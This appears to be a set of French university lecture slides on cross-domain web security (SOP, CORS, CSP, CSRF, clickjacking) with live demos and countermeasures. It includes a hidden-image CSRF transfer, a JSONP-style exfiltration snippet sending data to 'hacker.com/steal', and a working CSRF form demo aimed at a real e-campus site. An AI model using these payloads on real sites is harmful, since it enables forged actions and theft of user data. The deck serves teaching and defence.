---
layout: class
title: Attaques cross-domain
subtitle: CSRF, SOP, Mash-ups, sécurité AJAX
scripts: ['http://coffeescript.org/extras/coffee-script.js']
---

<section>

## Sécurité AJAX

AJAX est-il vulnérable à XSS ou d'autres types d'injections ?

**En bref :** ni plus ni moins que les pages Web 1.0, les `<form>`,
  les `<iframe>`, les `<img>`, etc.
  
**En détail :**

- Si l'on peut injecter du JavaScript, alors on peut injecter un
  XMLHttpRequest, et *vice versa* ;
- AJAX peut envoyer des **requêtes GET** : les **`<img>` aussi !**;
- AJAX peut envoyer des **requêtes POST** : on peut **créer un
  `<form>`** dans un `<iframe>` caché et le **soumettre**;
- AJAX peut **lire la réponse aux requêtes** GET et POST : en
  principe, les `<iframe>` **aussi** (plus de détails à suivre).

En pratique AJAX **n'est pas plus dangereux** que d'autres technologies,
mais il **élargit la surface d'attaque**.

</section>
<section>

## Same Origin Policy

Deux documents **ne provenant pas du même domaine** ne peuvent pas
accéder les contenus respectifs :

- Pas d'accès au DOM, aux cookies, aux URLs, ...
- Pas d'accès **entre fenêtres** et **entre frames**.

#### Cependant

- Les scripts inclus avec `<script>` ont plein accès (donc la SOP
  ne peut pas bloquer le **JavaScript injecté**) ;
- Autres balises violant la SOP (et pour cause) : `<img>`, `<link>`,
  `<embed>`, `<object>`, `<iframe>`, `<bgsound>`, ...
- `window.name` viole la SOP (pas très utilisé) ;
- [`window.postMessage`](https://developer.mozilla.org/docs/DOM/window.postMessage),
  introduit avec HTML5, promet une nouvelle vague de trous de sécurité !

Lire : <http://code.google.com/p/browsersec/wiki/Part2>.

</section>
<section>

## SOP : Exemple

<form id="go">
<input id="page" type="text" style="width:90%" />
<input type="submit" value="Go!" style="width:8%" />
</form>

<iframe id="sop" style="width:90%;height:60%;margin:auto;display:block">
</iframe>

<div class="centered">
<input id="child" type="button" value="Modifier fenêtre fils" style="margin: 0 1ex"/>
<input id="parent" type="button" value="Modifier fenêtre parent" style="margin: 0 1ex"/>
</div>

<style>
.highlight { background-color: yellow }
</style>

<script type="text/coffeescript">
page = document.location.href.replace(/#.*$/, '#sop-exemple');
$('#page').value = page
$('#go').onsubmit = () ->
    try
        $('#sop').contentDocument.location.replace $('#page').value
    catch err
        alert err
    return false

$('#child').onclick = () ->
    try
        $('#sop').contentDocument.body.classList.toggle('highlight')
    catch err
        alert err

$('#parent').onclick = () ->
    top.document.body.classList.toggle('highlight')
</script>

</section>
<section>

## Restrictions sur AJAX

- Un script peut envoyer une `XMLHttpRequest` **vers toute adresse** ;
- il ne peut lire que les réponses **provenant du même domaine**.

<form id="xhr-go">
<fieldset style="border:none">
<input id="xhr-page" type="text" style="width:90%" />
<input type="submit" value="Go!" style="width:8%" />
</fieldset>
</form>

<textarea id="xhr" style="width:100%;height:200px;margin:auto;display:block" readonly>
</textarea>

<script type="text/coffeescript">
page = document.location.protocol + '//' + document.location.host + document.location.pathname
$('#xhr-page').value = page
$('#xhr-go').onsubmit = () ->
    $('#xhr-go fieldset').disabled = true
    xhr = XMLHttpRequest()
    xhr.open 'GET', $('#xhr-page').value
    xhr.responseType = 'text'
    xhr.onerror = (e) ->
        alert e.type
    xhr.onload = () ->
        $('#xhr').value = xhr.response

    xhr.onloadend = () ->
        $('#xhr-go fieldset').disabled = false

    xhr.send()
    return false
</script>

**Problème :** comment interroger des APIs de sites tiers (Google
  maps, Yahoo finance, etc.) ?

</section>
<section>

##  AJAX Cross-domain

**Problème :** comment interroger des API tierces ?

Solution classique : **Proxies**

Écrire un programme côté server qui transmet la requête au service
web.


<svg width="620" height="250" style="margin:auto;display:block">
  <defs
     id="defs4">
    <marker
       inkscape:stockid="Arrow1Lend"
       orient="auto"
       refY="0"
       refX="0"
       id="Arrow1Lend"
       style="overflow:visible">
      <path
         d="M 0,0 5,-5 -12.5,0 5,5 0,0 z"
         style="fill-rule:evenodd;stroke:#000;"
         transform="matrix(-0.8,0,0,-0.8,-10,0)" />
    </marker>
    <marker
       inkscape:stockid="redarrow"
       orient="auto"
       refY="0"
       refX="0"
       id="redarrow"
       style="overflow:visible">
      <path
         d="M 0,0 5,-5 -12.5,0 5,5 0,0 z"
         style="fill-rule:evenodd;stroke:#f00;fill:#f00"
         transform="matrix(-0.8,0,0,-0.8,-10,0)" />
    </marker>
        <marker
       inkscape:stockid="cross"
       orient="auto"
       refY="0.0"
       refX="0.0"
       id="cross"
       style="overflow:visible">
      <g>
        <path
           d="M 4.6254930,-5.0456926  -5.4129913,4.9543074"
           style="fill:none;fill-rule:evenodd;stroke:#f00" />
        <path
           d="M -5.4129913,-5.0456926 4.6254930,4.9543074"
           style="fill:none;fill-rule:evenodd;stroke:#f00" />
      </g>
    </marker>
  </defs>
  <g>
    <text x="0" y="40" style="font-family:monospace">www.example.com</text>
    <text x="0" y="220">AJAX Client</text>
    <text x="350" y="40" style="font-family:monospace">query.yahooapis.com</text>
    <path
       style="fill:none;stroke:#000;marker-end:url(#Arrow1Lend)"
       d="m 30,60 0,130" />
    <image
        xlink:href="../assets/document.png"
        x="10" y="90"
        width="44" height="60" />
    <path
       style="fill:none;stroke:#000;marker-end:url(#Arrow1Lend)"
       d="m 100,190 0,-130" />
    <path
       style="fill:none;stroke:#000;marker-end:url(#Arrow1Lend)"
       d="m 120,60 0,130" />
    <text x="90" y="140" style="font-weight:bold;stroke:#888;fill:#000">AJAX</text>
    <path
       style="fill:none;stroke:#000;marker-end:url(#Arrow1Lend)"
       d="m 260,30 70,0" />
    <path
       style="fill:none;stroke:#000;marker-end:url(#Arrow1Lend)"
       d="m 330,40 -70,0" />
    <path
       style="fill:none;stroke:#000;marker-end:url(#Arrow1Lend)"
       d="m 160,200 300,-140" />
    <path
       style="fill:none;stroke:#f00;stroke-dasharray:1, 1;stroke-dashoffset:0;marker-end:url(#redarrow);marker-mid:url(#cross)"
       d="m 490,60 -36,17 -36,17 -36,17 -36,17 -36,17 -36,17 -36,17 -36,17 -36,17 " />
  </g>
</svg>

...Pas très satisfaisant

</section>
<section class="compact">

## Cross-Origin Resource Sharing

CORS : introduit dans Firefox 3.5, presque un standard :

1. Le `XMLHttpRequest` fait une requête GET cross-domain ;
2. Le browser ajoute une entête HTTP `Origin` ;

~~~
GET /api/query.php?car=peugeot HTTP/1.1
Host: api.webservice.com
...
Origin: www.example.com
~~~
{:.http}

3. Le server réponds avec **`Acces-Control-Allow-Origin`**:
{: start="3"}

~~~
HTTP/1.1 200 OK
...
Access-Control-Allow-Origin: *
~~~
{:.http}

~~~
HTTP/1.1 200 OK
...
Access-Control-Allow-Origin: www.example.com
~~~
{:.http}

4. Le browser renvoie la réponse à `XMLHttpRequest` seulement si
   l'origine est autorisée.
{: start="4"}

</section>
<section class="compact">

### Les requêtes POST ne sont pas *nilpotentes* !
(on ne peut pas défaire leurs effets)

1. `XMLHttpRequest` fait une requête POST cross-domain ;
2. Le browser change le type de la requête en **OPTIONS** ;

~~~
OPTIONS /api/query.php?car=peugeot HTTP/1.1
Host: api.webservice.com
Origin: www.example.com
Access-Control-Request-Method: POST
~~~

3. Le server réponds avec **`Acces-Control-Allow-Origin`** :
{: start="3"}

~~~
HTTP/1.1 200 OK
Access-Control-Allow-Origin: www.example.com
Access-Control-Allow-Methods: POST, GET, OPTIONS 
~~~

4. Si la requête est autorisée, le browser envoie la requête **POST** ;
{: start="4"}

~~~
POST /api/query.php?car=peugeot HTTP/1.1
Host: api.webservice.com
Origin: www.example.com
~~~

5. La réponse est renvoyée à `XMLHttpRequest`.
{: start="5"}

</section>
<section class="compact">

## CORS et sécurité 

CORS est une protection **opt-out** : `www.hacker.com` **ne peut pas
se connecter** à `www.mybank.com` **en se faisant passer pour un
utilisateur**

- Cohérent avec la SOP des frames et des fenêtres ;

`www.hacker.com` **peut obliger** `www.mybank.com` **à télécharger du
contenu** de `www.hacker.com`

- Nécessite une faille XSS pour démarrer l'attaque ;
- On peut faire pareil avec `<script>`, `<iframe>`, `<img>`, ...
- Cela pourrait être utilisé pour contourner un filtrage des balises
  `<script>`.

<svg width="550" height="300" style="margin:auto;display:block">
  <defs
     id="defs4">
    <marker
       orient="auto"
       refY="0"
       refX="0"
       id="Arrow2Lend"
       style="overflow:visible">
      <path
         d="M 0,0 5,-5 -12.5,0 5,5 0,0 z"
         style="fill-rule:evenodd;stroke:#000;"
         transform="matrix(-0.8,0,0,-0.8,-10,0)" />
    </marker>
    <marker
       orient="auto"
       refY="0"
       refX="0"
       id="redarrow2"
       style="overflow:visible">
      <path
         d="M 0,0 5,-5 -12.5,0 5,5 0,0 z"
         style="fill-rule:evenodd;stroke:#f00;fill:#f00"
         transform="matrix(-0.8,0,0,-0.8,-10,0)" />
    </marker>
        <marker
       orient="auto"
       refY="0.0"
       refX="0.0"
       id="cross2"
       style="overflow:visible">
      <g>
        <path
           d="M 4.6254930,-5.0456926  -5.4129913,4.9543074"
           style="fill:none;fill-rule:evenodd;stroke:#f00" />
        <path
           d="M -5.4129913,-5.0456926 4.6254930,4.9543074"
           style="fill:none;fill-rule:evenodd;stroke:#f00" />
      </g>
    </marker>
  </defs>
  <g>
    <text x="0" y="40" style="font-family:monospace">www.mybank.com</text>
    <text x="240" y="235">Client</text>
    <text x="350" y="40" style="font-family:monospace">www.hacker.com</text>
    <path
       style="fill:none;stroke:#000;marker-end:url(#Arrow2Lend)"
       d="m 340,35 -100,0" />
    <text x="260" y="45" style="font-weight:bold;stroke:#888;fill:#000">XSS</text>
    <path
       style="fill:none;stroke:#000;marker-end:url(#Arrow2Lend)"
       d="m 100,54 180,126 180,-126" />
    <path
       style="fill:none;stroke:#f00;stroke-dasharray:1, 1;stroke-dashoffset:0;marker-end:url(#redarrow2);marker-mid:url(#cross2)"
       d="m 480,60 -40,28 -40,28 -40,28 -40,28 -40,28 -40,-28 -40,-28 -40,-28 -40,-28 -40,-28 " />
  </g>
</svg>

</section>
<section>

## Content Security Policy

**Problème :** Comment mieux circonscrire les dangers d'un XSS ?

**CSP** restreint les actions sur la base du domaine d'origine, au
  niveau de HTTP :

### Ce que l'on peut restraindre

- JavaScript *inlined*, `eval`, CSS, transformations XSLT, Web Fonts ;
- Sources pour les balises HTML : `<script>`, `<object>`, `<embed>`, `<style>`, `<img>`, `<audio>`, `<video>`, `<iframe>` ;
- Sources pour les APIs DOM : `XMLHttpRequest`, WebSockets, Server events.

Voir : <http://www.w3.org/TR/CSP/#sotd>

</section>
<section class="compact">

## Exemple de CSP...

~~~
HTTP/1.1 200 OK
...
Content-Security-Policy: default-src 'self';
                         img-src *;
                         object-src media.example.com
                                    *.cdn.example.com;
                         script-src https://js.example.com;
                         connect-src https:
~~~

Les balises `<img>` sont **toujours permises**

~~~
<img src="http://farm1.staticflickr.com/1/xxxxxxxxxx.jpg" />
~~~

Les plugins sont autorisés uniquement sur **certains sous-domaines**

~~~
<object data="http://media.example.com/video.swf"></object>
~~~

</section>
<section class="compact">

## ...Exemple de CSP

`<script>` permises **uniquement sur `https://js.example.com`**

~~~
<script src="https://js.example.com/jquery.min.js"></script>
~~~


AJAX est permis **uniquement sur SSL**

~~~
var xhr = new XMLHttpRequest()
xhr.open("GET", "https://api.finance.com/cac40?c=total")
~~~

Tout autre contenu est **permis uniquement de la même page**

**Problème:** CSP est une protection **opt-in**. Elle doit être
configurée explicitement par le server.

</section>
<section>

## CSRF : attaques légitimes !

**Cross-Site Request Forgeries** : une faille intrinsèque du Web

### Les acteurs

Un **server** web possédant des **données confidentielles**.

Un **utilisateur légitime authentifié** ayant des **droits sur les
données**.

Un **attaquant** malicieux qui :

- connaît l'API du server (par ex., l'API est publique),
- contrôle un site tiers **sans rapport avec le server victime** (par
  ex., son propre server, ou un site avec une injection XSS).

### Les effets

L'attaquant gagne accès aux données confidentielles avec les droits de
l'utilisateur légitime.

</section>
<section class="compact">

## CSRF : Comment ?

### Pré-requis...

- L'utilisateur est **loggué sur le server** (par ex., il garde un
  onglet ouvert sur une page du server) ;
- L'utilisateur tombe par hasard sur **la page malicieuse de
  l'attaquant**.

### ...et ensuite

- La **page de l'attaquant** déclenche une requête au server

~~~
<html>
...
<h1>Recipe: Panini Reblochon Nutella</h1>
<h2>Ingrédients:</h2>
<ul>
<li>Two slices of bread</li>
...
<img width="0" height="0"
     src="http://server.com/transfer?to=attacker&amount=10k"/>
~~~

- Le browser de l'utilisateur, en voulant télécharger l'image,
déclanche un **transfert d'argent authentifié**.

</section>
<section>

## Démo CSRF : e-campus 2

1. Connectez-vous à <http://e-campus2.uvsq.fr/>,
2. Allez vers la
   [page du cours](http://e-campus2.uvsq.fr/cours/lucadefe/Cours.lucadefe.2012-01-04.1946).
3. Maintenant, supposons que vous visitiez un site au hasard (par ex.,
   ce site !!!), contenant cet `<iframe>` (caché par
   [`display:none`](javascript:){:.hide-frame}):

<iframe id="ecampus" style="width:90%;height:4em;margin:auto;display:block">
</iframe>

<style>
#ecampus.fade-out { opacity: 0 }
#ecampus, #ecampus.fade-out {
    transition: opacity 1s;
    -webkit-transition: opacity 1s;
}
</style>

<script type="text/coffeescript">
form = Element.prototype.append.call $('#ecampus').contentDocument.body, 'form#ecampus-form'
form.method = 'GET'
form.action = 'http://e-campus2.uvsq.fr/cours/lucadefe/Cours.lucadefe.2012-01-04.1946/cours_plan_form'
form.append = Element.prototype.append.bind(form)

data =
    'typeElement'      : 'TexteLibre',
    'titreElement'     : 'Cheap Viagra',
    'createurElement'  : 'Hacker',
    'form.submitted'   : '1',
    'form.button.save' : 'label_save'

for n, v of data
    i = form.append 'input'
    i.type = 'text'
    i.name = n
    i.value = v

i = form.append 'input'
i.type = 'submit'
i.value = 'Submit'

$('#csrf').onclick = () -> form.submit()

for t in $$('.hide-frame')
    t.onclick = () ->
        $('#ecampus').classList.toggle 'fade-out'
</script>

4. Si vous [cliquez ici](javascript:){:#csrf}, le formulaire est
   soumis, et le CSRF est exécuté.
5. Maintenant rafraîchissez
   [la page du cours](http://e-campus2.uvsq.fr/cours/lucadefe/Cours.lucadefe.2012-01-04.1946)
   et observez le résultat.
{: start="5"}


**Note :** Si le `<iframe>` avait été
  [vraiment caché](javascript:){:.hide-frame}, vous n'auriez rien
  remarqué.

**Note:** Il aurait été possible de tout faire **sans attendre de clic
  de l'utilisateur !**

</section>
<section class="compact">

## AJAX et CSRF : intercepter les données

- À cause de la requête `POST`, l'attaque précédente **n'aurait pas pu
  être menée** uniquement avec `XMLHttpRequest`.
- Mais AJAX offre des nouveaux points d'accès aux CSRF !

Imaginez une **API authentifiée** qui renvoie des requêtes JavaScript :

~~~
HTTP/1.1 200 OK
Content-Type: text/javascript
Access-Control-Allow-Origin: *
...

new UserData(
  "firstName", "Pinco"
  "lastName", Pallino",
  "creditCard", "XXXX XXXX XXXX XXXX",
);
~~~
{:.http}

- Les données sont renvoyées dans un objet `UserData` à `eval`uer.
- La définition de `UserData` est dans les scripts du client.
- Ceci est similaire au paradigme
  [JSONP](http://en.wikipedia.org/wiki/JSONP).

</section>
<section class="compact">

## L'application legitime

1. Le client charge le JavaScript fourni par le server

~~~
<script src="http://www.server.com/js/api.js"></script>
~~~

2. Le script contient la defintion de `UserData`
{: start="2"}

~~~
function Userdata() {
  this.creditCard = ...
}
~~~

3. Le client client fait une requête AJAX à l'API
{: start="3"}

~~~
xhr = new XMLHttpRequest();
xhr.open("GET", "http://api.server.com/getUserData?user=1000");
~~~

4. Le client `eval`ue le JavaScript et traite les données
{: start="4"}

~~~
var data = eval(xhr.response());
var card_number = data[5];
~~~

</section>
<section class="compact">

## L'attaquant

1. Crée une page sur un autre server qu'il contrôle ;
2. Inclue le JavaScript suivant (qui remplace la définition de
   `UserData`)

~~~
function UserData() {
    var img = new Image();
    img.src = "http://hacker.com/steal?" 
              + Array.join(",", arguments);
}
~~~

3. Il force le client à faire une requête à l'API
{: start="3"}

~~~
xhr = new XMLHttpRequest();
xhr.open("GET",
	     "http://api.server.com/getUserData?user=1000");
~~~

4. Le browser envoye les données à `http://hacker.com/steal` (à cause
   de l'`Image()`).
{: start="4"}

</section>
<section>

## CSRF dans la vraie vie

**GMail 2007 rédirection de mail :** des filtres de mails arbitraires
ont pu être configurés via CSRF

- <http://www.gnucitizen.org/blog/google-gmail-e-mail-hijack-technique/>
- <http://www.davidairey.com/google-gmail-security-hijack/>

**GMail 2007 vol de contacts :** les attaquants ont pu voler les
carnets d'adresses

- Basé sur JSONP, similaire à l'exemple AJAX + CSRF.
- <http://jeremiahgrossman.blogspot.fr/2007/01/gmail-xsrf-json-call-back-hackery.html>
- <http://jeremiahgrossman.blogspot.fr/2006/01/advanced-web-attack-techniques-using.html>

</section>
<section>

## Contremesures CSRF

### Utilisateur

- Se djélogguer ;
- Utiliser plusieurs browsers.

### Développeur

- Préférer POST à GET pour les requêtes qui déclenchent des actions ;
- Contrôler l'entête `Referer` ;
- Demander confirmation ;
- Faire expirer rapidement les sessions ;
- Utiliser des  captchas ;
- Ajouter des informations reliées à la session dans les URLs ;
- Cacher des jetons aléatoires jetables (**nonces**) dans les
  formulaires.

**Note :** il n'existe pas encore de protection définitive !

</section>
<section>

## Clickjacking et sécurité des Mash-up

Demander confirmation **peut ne pas être suffisant !**

Clickjacking : amener l'utilisateur à cliquer le bouton de
confirmation sans son consentement

- Inclure le formulaire de confirmation dans un `<iframe>` ;
- Utiliser CSS pour superposer le `<iframe>` à du contenu apparemment
  inoffensif ;
- Convaincre l'utilisateur à cliquer sur le contenu inoffensif ;
- Le clic va au `<iframe>` de confirmation.

**(Seule?) utilisation vérifiée :** Twitter 2009 "Don't click this"
<http://dsandler.org/outgoing/dontclick_orig.html>

</section>
<section>

## Clickjacking: Exemple

### [Suivez ce lien](../assets/clickjacking.html)

</section>
<section>

## Contremesures

Entête Expérimentale

~~~
X-Frame-Options: SAMEORIGIN
~~~

- Empêche aux browsers d'inclure la page dans des frames cross-domain ;
- Twitter s'en sert depuis 2009...

</section>
<section>

## Lectures

### Google browser security guide (M. Zalewski)

- <http://code.google.com/p/browsersec/wiki/Part1>,
- <http://code.google.com/p/browsersec/wiki/Part2>.

### Same Origin Policy

- [SOP](https://developer.mozilla.org/docs/Web/JavaScript/Same_origin_policy_for_JavaScript),
- [Cross Origin Resource Sharing](https://developer.mozilla.org/docs/HTTP/Access_control_CORS),
- [Content Security Policy](http://www.w3.org/TR/CSP/#sotd),
- [`X-Frame-Options`](https://developer.mozilla.org/docs/HTTP/X-Frame-Options).

### Clickjacking

- [Ajax and Mashup Security](http://www.openajax.org/whitepapers/Ajax and Mashup Security.php#Mashups),
- <https://www.owasp.org/index.php/Clickjacking>.

</section>
